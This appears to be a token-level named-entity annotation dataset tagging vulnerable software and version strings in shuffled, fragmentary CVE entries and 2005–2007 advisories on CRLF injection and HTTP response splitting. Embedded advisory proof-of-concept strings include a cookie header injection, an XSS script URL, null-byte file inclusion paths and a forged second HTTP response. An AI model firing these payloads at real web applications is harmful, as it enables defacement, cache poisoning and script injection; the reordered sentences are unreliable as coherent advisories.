to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
probably O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
CRLF O O
sequences O O
in O O
the O O
url O O
parameter O O
. O O

NOTE O O
: O O
this O O
can O O
be O O
leveraged O O
for O O
cross-site O O
scripting O O
( O O
XSS O O
) O O
attacks O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
redirect O O
feature O O
in O O
Sun S-vulnerable_software pair_0
Java S-vulnerable_software pair_0
System S-vulnerable_software pair_0
Web S-vulnerable_software pair_0
Server S-vulnerable_software pair_0
6.1 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
7.0 S-vulnerable_version pair_0
before S-vulnerable_version pair_0
20070802 S-vulnerable_version pair_0
, O O
when O O
the O O
redirect O O
Server O O
Application O O
Function O O
( O O
SAF O O
) O O
uses O O
the O O
url-prefix O O
parameter O O
and O O
escape O O
is O O
disabled O O
, O O
or O O
an O O
Error O O
directive O O
uses O O
the O O
url-prefix O O
parameter O O
in O O
obj.conf O O
, O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
www/delivery/ck.php O O
in O O
Openads S-vulnerable_software pair_0
2.3 S-vulnerable_version pair_0
( O O
aka S-vulnerable_software pair_0
Max S-vulnerable_software pair_0
Media S-vulnerable_software pair_0
Manager S-vulnerable_software pair_0
, O O
MMM S-vulnerable_software pair_0
) O O
before S-vulnerable_version pair_0
0.3.31-alpha-pr3 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
CRLF O O
sequences O O
in O O
the O O
destination O O
parameter O O
. O O

Multiple O O
CRLF O O
injection O O
vulnerabilities O O
in O O
adclick.php O O
in O O
( O O
a O O
) O O
Openads S-vulnerable_software pair_0
( O O
phpAdsNew S-vulnerable_software pair_0
) O O
2.0.11 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
and O O
( O O
b O O
) O O
Openads O O
for O O
PostgreSQL S-vulnerable_software pair_1
( O O
phpPgAds S-vulnerable_software pair_1
) O O
2.0.11 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
earlier S-vulnerable_version pair_1
allow O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
CRLF O O
sequences O O
in O O
( O O
1 O O
) O O
the O O
dest O O
parameter O O
and O O
( O O
2 O O
) O O
the O O
Referer O O
HTTP O O
header O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
phpMyVisites S-vulnerable_software pair_0
before S-vulnerable_version pair_0
2.2 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
CRLF O O
sequences O O
in O O
the O O
url O O
parameter O O
, O O
when O O
the O O
pagename O O
parameter O O
begins O O
with O O
FILE O O
: O O
. O O

This O O
software O O
is O O
a O O
free O O
and O O
powerful O O
open O O
source O O
( O O
GNU/GPL O O
) O O
software O O
for O O
websites O O
statistics O O
and O O
audience O O
measurements O O
: O O
Impacted O O
versions O O
: O O
Versions O O
2.2 S-vulnerable_version O
stable S-vulnerable_version O
( O O
released O O
on O O
November O O
10 O O
, O O
2006 O O
) O O
and O O
newer O O
are O O
not O O
impacted O O
by O O
these O O
vulnerabilities O O
. O O

So O O
tmp/utf-8.php O O
would O O
be O O
accepted O O
. O O

Multiple O O
vulnerabilities O O
in O O
phpMyVisites O O
Application O O
: O O
phpMyVisites S-vulnerable_software pair_0
prior S-vulnerable_version pair_0
to S-vulnerable_version pair_0
2.2 S-vulnerable_version pair_0
stable S-vulnerable_version pair_0
Release O O
Date O O
: O O
11 O O
February O O
2007 O O
Author O O
: O O
Nicob O O
< O O
nicob O O
at O O
nicob.net O O
Abstract O O
: O O
Several O O
vulnerabilities O O
were O O
identified O O
in O O
phpMyVisites O O
. O O

So O O
my O O
brief O O
code O O
audit O O
focused O O
on O O
this O O
very O O
file O O
. O O

Some O O
vulnerabilities O O
in O O
these O O
libraries O O
were O O
patched O O
in O O
version O O
2.2 S-vulnerable_version O
stable O O
too O O
. O O

Notes O O
: O O
- O O
only O O
one O O
PHP O O
file O O
( O O
phpmyvisites.php O O
) O O
need O O
to O O
be O O
remotely O O
accessed O O
by O O
visitors O O
. O O

A O O
paranoid O O
installation O O
will O O
allow O O
remote O O
access O O
only O O
to O O
this O O
file O O
( O O
for O O
example O O
via O O
htaccess O O
) O O
. O O

- O O
external O O
libraries O O
( O O
smarty O O
, O O
phpMailer O O
, O O
PEAR O O
are O O
embedded O O
in O O
any O O
phpMyVisites O O
install O O
. O O

Part O O
of O O
this O O
cookie O O
is O O
used O O
to O O
construct O O
a O O
file O O
path O O
, O O
which O O
is O O
then O O
used O O
in O O
a O O
require O O
( O O
) O O
call O O
: O O
if O O
( O O
! O O
isset O O
( O O
$ O O
this- O O
> O O
file O O
) O O
|| O O
! O O
strpos O O
( O O
$ O O
this- O O
> O O
file O O
, O O
utf-8.php O O
strpos O O
( O O
$ O O
this- O O
> O O
file O O
this- O O
> O O
file O O
= O O
$ O O
this- O O
> O O
getNearestLang O O
( O O
) O O
; O O
} O O
require O O
LANGS_PATH O O
. O O

$ O O
this- O O
> O O
file O O
; O O
In O O
this O O
code O O
, O O
the O O
third O O
check O O
is O O
FALSE O O
if O O
the O O
strpos O O
( O O
) O O
call O O
returns O O
FALSE O O
_or_ O O
0 O O
. O O

Vulnerabilities O O
: O O
- O O
HTTP O O
Response O O
Splitting O O
via O O
the O O
url O O
parameter O O
( O O
triggered O O
when O O
the O O
pagename O O
parameter O O
begins O O
by O O
FILE O O
Cross O O
Site O O
Scripting O O
in O O
function O O
GetCurrentCompletePath O O
( O O
) O O
: O O
cation O O
) O O
< O O
/script O O
> O O
B/CCC O O
- O O
Local O O
file O O
include O O
via O O
the O O
pmv_ck_view O O
cookie O O
parameter O O
. O O

Multiple O O
vulnerabilities O O
in O O
phpMyVisites O O

Multiple O O
CRLF O O
injection O O
vulnerabilities O O
in O O
PhpMyAdmin S-vulnerable_software pair_0
2.7.0-pl2 S-vulnerable_version pair_0
allow O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
CRLF O O
sequences O O
in O O
a O O
phpMyAdmin O O
cookie O O
in O O
( O O
1 O O
) O O
css/phpmyadmin.css.php O O
, O O
( O O
2 O O
) O O
db_create.php O O
, O O
( O O
3 O O
) O O
index.php O O
, O O
( O O
4 O O
) O O
left.php O O
, O O
( O O
5 O O
) O O
libraries/session.inc.php O O
, O O
( O O
6 O O
) O O
libraries/transformations/overview.php O O
, O O
( O O
7 O O
) O O
querywindow.php O O
, O O
( O O
8 O O
) O O
server_engines.php O O
, O O
and O O
possibly O O
other O O
files O O
. O O

Tested O O
: O O
Just O O
2.7.0-pl2 O O
CRLF O O
] O O
] O O
] O O
Files O O
/css/phpmyadmin.css.php O O
/db_create.php O O
/index.php O O
/left.php O O
/libraries/session.inc.php O O
/libraries/transformations/overview.php O O
/querywindow.php O O
/server_engines.php O O
Files O O
Cookie O O
: O O
- O O
> O O
Open O O
Cookie O O
Editor O O
- O O
> O O
Find O O
the O O
phpMyAdmin O O
value O O
- O O
> O O
Write O O
it O O
; O O
phpMyAdmin= O O
% O O
0d O O
% O O
0aSet-Cookie O O
% O O
3Asome O O
% O O
3Dvalue O O
New O O
Cookie O O
= O O
some=value O O
CRLF O O
] O O
] O O
] O O
[ O O
[ O O
PATH O O
] O O
] O O
] O O
File O O
libraries/common.lib.php O O
/File O O
[ O O
[ O O
/PATH O O
ajann O O
, O O
Turkey O O
Im O O
not O O
Hacker O O
! O O

Title O O
: O O
PhpMyAdmin S-vulnerable_software pair_0
2.7.0-pl2 S-vulnerable_version pair_0
Path O O
Disclosure O O
| O O
Multiple O O
CRLF/Http O O
Response O O
Splitting O O
Vulnerability O O
Author O O
: O O
ajann O O
Contact O O

PhpMyAdmin S-vulnerable_software pair_0
2.7.0-pl2 S-vulnerable_version pair_0
Path O O
Disclosure O O
| O O
Multiple O O
CRLF/Http O O
Response O O
Splitting O O

CRLF O O
injection O O
vulnerability O O
in O O
viewcvs O O
in O O
ViewCVS S-vulnerable_software pair_0
0.9.2 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
CRLF O O
sequences O O
in O O
the O O
content-type O O
parameter O O
. O O

Of O O
course O O
, O O
both O O
of O O
this O O
could O O
easily O O
happen O O
on O O
web O O
sites O O
such O O
as O O
Sourceforge O O
( O O
who O O
, O O
however O O
, O O
introduced O O
separate O O
subdomains O O
for O O
user O O
authentication O O
and O O
web O O
based O O
access O O
to O O
CVS O O
) O O
, O O
or O O
sites O O
which O O
use O O
CVS O O
in O O
the O O
way O O
a O O
version O O
controlled O O
wiki O O
is O O
used O O
and O O
allow O O
public O O
write O O
access O O
. O O

However O O
, O O
all O O
of O O
the O O
above O O
requires O O
that O O
some O O
admin O O
messes O O
around O O
with O O
CVS O O
write O O
access O O
on O O
the O O
server O O
ViewCVS O O
grants O O
read O O
access O O
to O O
and O O
gave O O
access O O
to O O
someone O O
with O O
bad O O
intentions O O
or O O
no O O
clue O O
. O O

I O O
suggest O O
that O O
Linux O O
distributions O O
should O O
patch O O
this O O
issue O O
short O O
term O O
and O O
deprecate O O
support O O
for O O
ViewCVS O O
mid O O
to O O
long O O
term O O
. O O

For O O
an O O
example O O
, O O
please O O
compare O O
what O O
your O O
web O O
browser O O
displays O O
on O O
these O O
locations O O
: O O
p/test00.htm O O
rev=1.9 O O
& O O
content-type=text/vnd.viewcvs-markup O O
p/test00.htm O O
rev=1.9 O O
& O O
content-type=text/html O O
The O O
two O O
obviously O O
look O O
somewhat O O
differently O O
, O O
and O O
on O O
the O O
second O O
location O O
you O O
can O O
see O O
( O O
assuming O O
you O O
have O O
Javascript O O
activated O O
globally O O
) O O
that O O
a O O
request O O
is O O
made O O
to O O
Google O O
( O O
from O O
within O O
the O O
security O O
context O O
of O O
cvs.sourceforge.jp O O
) O O
. O O

Short O O
version O O
for O O
the O O
busy O O
ones O O
: O O
o O O
Security O O
issue O O
on O O
ViewCVS O O
0.9.4 O O
o O O
Not O O
really O O
exploitable O O
unless O O
malicious O O
users O O
have O O
CVS O O
write O O
access O O
AND O O
victim O O
visits O O
pre-crafted O O
URL O O
ViewCVS O O
0.9.4 O O
is O O
no O O
longer O O
under O O
development O O
, O O
has O O
been O O
abandoned O O
in O O
favor O O
of O O
ViewVC O O
( O O
and O O
should O O
probably O O
no O O
longer O O
be O O
used O O
in O O
production O O
environments O O
. O O

Explicitly O O
limit O O
your O O
application O O
to O O
the O O
functionality O O
you O O
want O O
and O O
need O O
it O O
to O O
have O O
. O O

The O O
0.9.4 S-vulnerable_version O
release O O
on O O
viewvc.tigris.org O O
seems O O
to O O
be O O
unpatched O O
and O O
it O O
possible O O
that O O
some O O
Linux O O
distributions O O
and O O
whoever O O
would O O
normally O O
care O O
were O O
never O O
patched O O
against O O
this O O
. O O

The O O
issue O O
is O O
one O O
which O O
can O O
hardly O O
be O O
practially O O
exploited O O
( O O
thus O O
this O O
short O O
and O O
boring O O
advisory O O
and O O
no O O
prior O O
notice O O
to O O
the O O
previous O O
developers O O
) O O
. O O

But O O
XSS O O
is O O
just O O
one O O
possibility O O
. O O

More O O
precisely O O
, O O
do O O
not O O
use O O
user O O
generated O O
data O O
provided O O
in O O
HTTP O O
requests O O
to O O
specify O O
content O O
types O O
of O O
HTTP O O
responses O O
unless O O
you O O
are O O
using O O
a O O
whitelisting O O
approach O O
. O O

Moritz O O
BEGIN O O
PGP O O
SIGNATURE O O
Version O O
: O O
GnuPG O O
v1.4.6 O O
( O O
GNU/Linux O O
) O O
iD8DBQFF41Hln6GkvSd/BgwRAgWSAJ47KZFCVAdzLMURunMFZWrKz7AbFACdHxo7 O O
LTzzddXx7obLmXGsot4d1ug= O O
=T0XX O O
END O O
PGP O O
SIGNATURE O O
( O O
1 O O
replies O O
) O O

Unfortunately O O
this O O
script O O
_is_ O O
still O O
widely O O
used O O
, O O
so O O
I O O
think O O
it O O
still O O
worth O O
telling O O
about O O
this O O
otherwise O O
not O O
really O O
important O O
finding O O
. O O

This O O
means O O
that O O
ViewCVS O O
and O O
thus O O
the O O
domain O O
it O O
runs O O
in O O
is O O
vulnerable O O
to O O
Cross O O
Site O O
Scripting O O
, O O
assuming O O
that O O
someone O O
not O O
fully O O
trustable O O
has O O
write O O
permissions O O
on O O
one O O
of O O
the O O
CVS O O
repositories O O
ViewCVS O O
grants O O
access O O
to O O
here O O
. O O

The O O
source O O
of O O
the O O
problem O O
is O O
that O O
ViewCVS O O
allows O O
users O O
to O O
specify O O
the O O
content O O
type O O
which O O
the O O
server O O
generated O O
HTTP O O
response O O
will O O
be O O
sent O O
with O O
. O O

Thanks O O
for O O
reading O O
, O O
have O O
a O O
fine O O
day O O
. O O

However O O
, O O
it O O
is O O
actually O O
more O O
than O O
the O O
response O O
splitting O O
issue O O
. O O

This O O
was O O
previously O O
considered O O
a O O
HTTP O O
response O O
splitting O O
vulnerability O O
by O O
Jose O O
Antonio O O
Coret O O
( O O
Joxean O O
Koret O O
) O O
tml O O
( O O
BID O O
12112 O O
, O O
couldn O O
t O O
find O O
a O O
CVE O O
, O O
AFAICT O O
it O O
is O O
_not_ O O
CAN-2004-1062 O O
) O O
and O O
, O O
according O O
to O O
him O O
, O O
a O O
patch O O
has O O
been O O
stored O O
on O O
the O O
1.0-dev O O
CVS O O
branch O O
. O O

Web O O
application O O
developer O O
lessons O O
learnt O O
( O O
once O O
again O O
) O O
: O O
1 O O
. O O

This O O
should O O
also O O
work O O
for O O
delivering O O
VML O O
exploits O O
and O O
other O O
funny O O
stuff O O
, O O
such O O
as O O
... O O
when O O
some O O
victim O O
uses O O
a O O
funny O O
web O O
browser O O
( O O
such O O
as O O
Internet O O
Explorer O O
5.5/6/7 O O
) O O
and O O
some O O
attacker O O
stores O O
files O O
such O O
as O O
this O O
in O O
a O O
CVS O O
repository O O
and O O
makes O O
the O O
victim O O
access O O
it O O
with O O
with O O
& O O
content-type=image/jpeg O O
appended O O
to O O
the O O
ViewCVS O O
URL O O
. O O

ViewCVS S-vulnerable_software pair_0
0.9.4 S-vulnerable_version pair_0
issues O O

Multiple O O
HTTP O O
response O O
splitting O O
vulnerabilities O O
in O O
Hitachi S-vulnerable_software pair_0
Business S-vulnerable_software pair_0
Logic S-vulnerable_software pair_0
- O O
Container S-vulnerable_software pair_0
( O O
BLC S-vulnerable_software pair_0
) O O
P-2443-9114 S-vulnerable_version pair_0
01-00 S-vulnerable_version pair_0
through S-vulnerable_version pair_0
02-06 S-vulnerable_version pair_0
on O O
Windows O O
, O O
and O O
P-1M43-9111 S-vulnerable_version O
01-01 S-vulnerable_version O
through S-vulnerable_version O
02-00 S-vulnerable_version O
on O O
AIX O O
, O O
allow O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
via O O
unknown O O
attack O O
vectors O O
in O O
an O O
unspecified O O
input O O
form O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Mantis S-vulnerable_software pair_0
1.0.0rc3 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
modify O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
( O O
1 O O
) O O
the O O
return O O
parameter O O
in O O
login_cookie_test.php O O
and O O
( O O
2 O O
) O O
ref O O
parameter O O
in O O
login_select_proj_page.php O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
phpMyAdmin S-vulnerable_software pair_0
before S-vulnerable_version pair_0
2.6.4-pl4 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
scripts O O
. O O

HTTP O O
response O O
splitting O O
vulnerability O O
in O O
index.php O O
in O O
phpSysInfo S-vulnerable_software pair_0
2.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
as O O
used O O
in O O
phpgroupware S-vulnerable_software pair_1
0.9.16 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
earlier S-vulnerable_version pair_1
, O O
and O O
egroupware S-vulnerable_software pair_2
before S-vulnerable_version pair_2
1.0.0.009 S-vulnerable_version pair_2
, O O
allows O O
remote O O
attackers O O
to O O
spoof O O
web O O
content O O
and O O
poison O O
web O O
caches O O
via O O
CRLF O O
sequences O O
in O O
the O O
charset O O
parameter O O
. O O

This O O
response O O
is O O
the O O
only O O
one O O
that O O
will O O
be O O
returned O O
by O O
any O O
intermediate O O
proxy O O
, O O
showing O O
what- O O
ever O O
HTML O O
the O O
attacker O O
injected O O
previously O O
. O O

November O O
2005 O O
- O O
Public O O
disclosure O O
. O O

Vendor O O
Status O O
: O O

References O O
: O O
e.pdf O O
Plug O O
: O O
You O O
can O O
discuss O O
this O O
and O O
other O O
vulnerabilities O O
in O O
our O O
forum O O
at O O
- O O
an O O
up-to-date O O
list O O
of O O
advisories O O
can O O
be O O
found O O
at O O
GPG-Key O O
: O O
pub O O
1024D/0A864AA1 O O
2004-04-17 O O
Hardened-PHP O O
Signature O O
Key O O
Key O O
fingerprint O O
= O O
066F O O
A6D0 O O
E57E O O
9936 O O
9082 O O
7E52 O O
4439 O O
14CC O O
0A86 O O
4AA1 O O
Copyright O O
2005 O O
Christopher O O
Kunz O O
Hardened O O
PHP O O
Project O O
. O O

November O O
2005 O O
- O O
2.4 O O
does O O
not O O
seem O O
to O O
fix O O
- O O
own O O
patch O O
sent O O
to O O
vendor O O
. O O

November O O
2005 O O
- O O
Bug O O
disclosed O O
to O O
vendor O O
. O O

We O O
also O O
recommend O O
installing O O
the O O
Hardening O O
Patch O O
for O O
PHP O O
which O O
would O O
have O O
mitigated O O
the O O
response O O
splitting O O
problem O O
( O O
by O O
not O O
allowing O O
multiline O O
headers O O
) O O
and O O
the O O
$ O O
_SERVER O O
overwriting O O
issues O O
( O O
by O O
not O O
allowing O O
certain O O
superglobals O O
to O O
be O O
overwritten O O
from O O
the O O
outside O O
) O O
. O O

The O O
other O O
XSS O O
holes O O
mentioned O O
in O O
that O O
ad- O O
visory O O
are O O
still O O
valid O O
, O O
too O O
. O O

In O O
the O O
Debian O O
Sarge O O
package O O
, O O
injecting O O
only O O
HTTP_ACCEPT_LANGUAGE O O
is O O
suffi- O O
cient O O
- O O
the O O
current O O
source O O
tree O O
( O O
phpsysinfo-dev O O
from O O
sf.net O O
) O O
requires O O
the O O
attacker O O
to O O
additionally O O
inject O O
the O O
$ O O
lng O O
parameter O O
. O O

It O O
is O O
, O O
however O O
, O O
not O O
exploitable O O
on O O
Debian O O
systems O O
. O O

In O O
all O O
other O O
cases O O
, O O
it O O
can O O
be O O
set O O
via O O
the O O
URL O O
. O O

By O O
breaking O O
up O O
the O O
argument O O
with O O
, O O
the O O
attacker O O
can O O
inject O O
a O O
complete O O
second O O
HTTP O O
response O O
. O O

November O O
2005 O O
- O O
New O O
updated O O
version O O
2.4.1 O O
fixes O O
the O O
issues O O
. O O

All O O
rights O O
reserved O O
. O O

Vendor O O
has O O
released O O
an O O
updated O O
version O O
. O O

Disclosure O O
Timeline O O
: O O
10 O O
. O O

Details O O
: O O
It O O
is O O
important O O
to O O
note O O
that O O
due O O
to O O
the O O
nature O O
of O O
phpSysInfo O O
, O O
it O O
is O O
unlikely O O
to O O
be O O
run O O
inside O O
an O O
open_basedir O O
, O O
since O O
most O O
of O O
the O O
information O O
the O O
software O O
obtains O O
is O O
from O O
the O O
/proc O O
or O O
/etc O O
directories O O
. O O

If O O
they O O
have O O
a O O
way O O
to O O
create O O
content O O
on O O
the O O
target O O
server O O
( O O
such O O
as O O
an O O
entry O O
in O O
syslog O O
or O O
the O O
web O O
server O O
log O O
file O O
) O O
, O O
they O O
can O O
use O O
this O O
to O O
execute O O
arbitrary O O
code O O
. O O

This O O
variable O O
is O O
fed O O
to O O
a O O
header O O
( O O
) O O
call O O
without O O
any O O
additional O O
checks O O
. O O

We O O
have O O
provided O O
a O O
bugfix O O
to O O
the O O
vendor O O
, O O
which O O
, O O
in O O
addition O O
to O O
their O O
own O O
fix O O
, O O
will O O
be O O
included O O
in O O
version O O
2.4.1 O O
of O O
phpSysInfo O O
. O O

Proof O O
of O O
Concept O O
: O O
The O O
examples O O
above O O
should O O
provide O O
you O O
with O O
enough O O
PoC O O
to O O
validate O O
the O O
ex- O O
istance O O
of O O
the O O
vulnerabilities O O
. O O

Credits O O
: O O
All O O
vulnerabilities O O
were O O
investigated O O
by O O
the O O
Hardened-PHP O O
Project O O
. O O

They O O
can O O
be O O
abused O O
with O O
register_globals O O
Off O O
, O O
this O O
is O O
different O O
from O O
the O O
advisory O O
by O O
ISS O O
. O O

BEGIN O O
PGP O O
SIGNATURE O O
Version O O
: O O
GnuPG O O
v1.0.6 O O
( O O
GNU/Linux O O
) O O

a O O
.htaccess O O
file O O
. O O

It O O
will O O
displays O O
things O O
like O O
Uptime O O
, O O
CPU O O
, O O
Memory O O
, O O
SCSI O O
, O O
IDE O O
, O O
PCI O O
, O O
Ethernet O O
, O O
Floppy O O
, O O
and O O
Video O O
Information O O
. O O

Using O O
HTTP O O
Response O O
Splitting O O
, O O
arbitrary O O
strings O O
can O O
be O O
injected O O
into O O
the O O
variable O O
$ O O
charset O O
, O O
which O O
is O O
meant O O
to O O
include O O
a O O
value O O
such O O
as O O
iso-8859-1 O O
or O O
similar O O
, O O
but O O
is O O
only O O
set O O
to O O
a O O
value O O
inside O O
a O O
language O O
include O O
file O O
if O O
a O O
language O O
in O O
fact O O
requires O O
a O O
character O O
set O O
different O O
from O O
iso-8859-1 O O
. O O

With O O
this O O
variable O O
, O O
arbitrary O O
file O O
inclusion O O
is O O
possible O O
on O O
some O O
platforms O O
, O O
dependant O O
on O O
the O O
local O O
realpath O O
( O O
) O O
implementation O O
. O O

Additionally O O
, O O
access O O
to O O
the O O
includes O O
directory O O
should O O
be O O
restricted O O
by O O
appropriate O O
means O O
, O O
e.g O O
. O O

An O O
additional O O
attack O O
vector O O
for O O
Cross-Site O O
Scripting O O
attacks O O
is O O
the O O
variable O O
$ O O
VERSION O O
, O O
which O O
is O O
used O O
for O O
the O O
version O O
string O O
displayed O O
on O O
the O O
bottom O O
of O O
each O O
page O O
. O O

Credit O O
to O O
referred O O
vulnerabilities O O
goes O O
to O O
the O O
original O O
authors O O
, O O
as O O
mentioned O O
on O O
CVE O O
. O O

Example O O
: O O
/index.php O O
VERSION= O O
% O O
22 O O
% O O
3E O O
% O O
3Cscript O O
% O O
3Ealert O O
( O O
xss O O
) O O
% O O
3C/script O O
% O O
3E O O
A O O
fairly O O
unknown O O
attack O O
class O O
is O O
so-called O O
HTTP O O
Response O O
Splitting O O
, O O
an O O
at- O O
tack O O
that O O
allows O O
for O O
selective O O
defacement O O
of O O
web O O
pages O O
by O O
poisoning O O
for- O O
warding O O
or O O
reverse O O
proxies O O
. O O

The O O
reason O O
for O O
this O O
problem O O
lies O O
in O O
the O O
incorrect O O
handling O O
of O O
variables O O
by O O
the O O
globalization O O
layer O O
implemented O O
in O O
phpSysInfo O O
index.php O O
- O O
quote O O
: O O
if O O
( O O
! O O
empty O O
( O O
$ O O
HTTP_GET_VARS O O
) O O
) O O
while O O
( O O
list O O
( O O
$ O O
name O O
, O O
$ O O
value O O
) O O
= O O
each O O
( O O
$ O O
HTTP_GET_VARS O O
) O O
) O O
$ O O
$ O O
name O O
= O O
$ O O
value O O
; O O
if O O
( O O
! O O
empty O O
( O O
$ O O
HTTP_POST_VARS O O
) O O
) O O
while O O
( O O
list O O
( O O
$ O O
name O O
, O O
$ O O
value O O
) O O
= O O
each O O
( O O
$ O O
HTTP_POST_VARS O O
) O O
) O O
$ O O
$ O O
name O O
= O O
$ O O
value O O
; O O
As O O
the O O
interested O O
reader O O
will O O
easily O O
see O O
, O O
this O O
two-liner O O
overwrites O O
the O O
complete O O
scope O O
, O O
including O O
the O O
superglobal O O
variable O O
$ O O
_SERVER O O
. O O

A O O
number O O
of O O
holes O O
- O O
all O O
of O O
them O O
attributed O O
to O O
a O O
rather O O
crude O O
( O O
and O O
unneeded O O
) O O
register_globals O O
emulation O O
- O O
allow O O
for O O
arbitrary O O
file O O
inclusion O O
, O O
amongst O O
other O O
things O O
. O O

Example O O
: O O
/index.php O O
sensor_program=lmsensors.inc.php O O
README O O
% O O
00 O O
Additionally O O
, O O
$ O O
sensor_program O O
can O O
still O O
be O O
used O O
to O O
inject O O
active O O
contents O O
into O O
the O O
page O O
, O O
known O O
as O O
Cross-Site O O
Scripting O O
. O O

Direct O O
access O O
will O O
probably O O
yield O O
an O O
empty O O
page O O
, O O
since O O
many O O
browsers O O
do O O
not O O
know O O
how O O
to O O
handle O O
more O O
than O O
one O O
response O O
to O O
a O O
HTTP O O
request O O
. O O

CVE O O
Information O O
: O O
The O O
Common O O
Vulnerabilities O O
and O O
Exposures O O
project O O
( O O
cve.mitre.org O O
) O O
has O O
assigned O O
the O O
name O O
CVE-2005-3347 O O
to O O
the O O
file O O
inclusion O O
issue O O
and O O
the O O
name O O
name O O
CVE-2005-3348 O O
to O O
the O O
HTTP O O
response O O
splitting O O
problem O O
. O O

Example O O
: O O
/index.php O O
_SERVER O O
[ O O
HTTP_ACCEPT_LANGUAGE O O
README O O
% O O
00 O O
/index.php O O
_SERVER O O
[ O O
HTTP_ACCEPT_LANGUAGE O O
README O O
% O O
00 O O
& O O
lng O O
README O O
% O O
00 O O
The O O
variable O O
$ O O
sensor_program O O
is O O
set O O
in O O
config.php O O
, O O
but O O
can O O
be O O
overwritten O O
since O O
config.php O O
is O O
actually O O
included O O
before O O
reglobalization O O
takes O O
place O O
. O O

If O O
you O O
want O O
to O O
fix O O
the O O
issue O O
yourself O O
, O O
just O O
comment O O
out O O
the O O
lines O O
mentioned O O
in O O
an O O
earlier O O
paragraph O O
of O O
this O O
advisory O O
and O O
selectively O O
infer O O
the O O
variables O O
$ O O
_REQUEST O O
[ O O
lng O O
] O O
and O O
$ O O
_REQUEST O O
[ O O
template O O
] O O
from O O
the O O
outside O O
. O O

References O O
: O O
Overview O O
: O O
phpSysInfo O O
is O O
a O O
PHP O O
script O O
that O O
displays O O
information O O
about O O
the O O
host O O
being O O
accessed O O
. O O

November O O
2005 O O
- O O
Updated O O
version O O
2.4 O O
released O O
. O O

An O O
explanation O O
of O O
this O O
attack O O
class O O
is O O
beyond O O
the O O
scope O O
of O O
this O O
advisory O O
, O O
a O O
whitepaper O O
can O O
be O O
obtained O O
at O O
. O O

if O O
the O O
victim O O
accesses O O
the O O
phpSysInfo O O
instance O O
from O O
be- O O
hind O O
a O O
proxy O O
. O O

Example O O
: O O
/index.php O O
charset= O O
% O O
0d O O
% O O
0aContent-Length O O
: O O
% O O
200 O O
% O O
0d O O
% O O
0a O O
% O O
0d O O
% O O
0aHTTP/1.1 O O
% O O
20200 O O
% O O
2 O O
0OK O O
% O O
0d O O
% O O
0aContent-Type O O
: O O
% O O
20text/html O O
% O O
0d O O
% O O
0aContent-Length O O
: O O
% O O
2019 O O
% O O
0d O O
% O O
0a O O
% O O
0d O O
% O O
0a O O
< O O
htm O O
l O O
> O O
Ha O O
cked O O
! O O
< O O
/html O O
This O O
example O O
will O O
print O O
out O O
a O O
simple O O
( O O
and O O
invalid O O
) O O
HTML O O
page O O
containing O O
only O O
the O O
string O O
Hacked O O
! O O

Comment O O
: O O
For O O
info O O
see O O
iD8DBQFDdyOFRDkUzAqGSqERAt9KAJ4uCXhrcapN/zxWDS6n7y8ezp6xsQCgw28i O O
HSdHc4zKJ8aCj5gSC8Zxlj4= O O
=XRw5 O O
END O O
PGP O O
SIGNATURE O O

BEGIN O O
PGP O O
SIGNED O O
MESSAGE O O
Hash O O
: O O
SHA1 O O
Hardened O O
PHP O O
Project O O
-= O O
Security O O
Advisory O O
=- O O
Advisory O O
: O O
Multiple O O
vulnerabilities O O
in O O
phpSysInfo O O
Release O O
Date O O
: O O
2005/11/13 O O
Last O O
Modified O O
: O O
2005/11/12 O O
Author O O
: O O
Christopher O O
Kunz O O
< O O
christopher.kunz O O
( O O
at O O
) O O
hardened-php O O
( O O
dot O O
) O O
net O O
[ O O
email O O
concealed O O
] O O
Application O O
: O O
phpSysInfo O O
2.4 O O
and O O
prior O O
Severity O O
: O O
Cross-Site O O
Scripting O O
, O O
HTTP O O
Response O O
Splitting O O
, O O
Arbitrary O O
local O O
file O O
inclusion O O
Risk O O
: O O
Medium O O

In O O
fact O O
, O O
the O O
author O O
requires O O
that O O
safe_mode O O
be O O
set O O
to O O
Off O O
and O O
no O O
other O O
restrictions O O
be O O
imposed O O
on O O
the O O
PHP O O
installation O O
. O O

A O O
hole O O
that O O
was O O
reported O O
in O O
CVE-2003-0536 O O
and O O
is O O
reported O O
as O O
fixed O O
in O O
the O O
phpSysInfo O O
README O O
still O O
persists O O
. O O

Furthermore O O
, O O
few O O
admin- O O
istrators O O
will O O
restrict O O
its O O
access O O
to O O
PHP O O
shell O O
functions O O
, O O
since O O
a O O
such O O
restriction O O
would O O
render O O
the O O
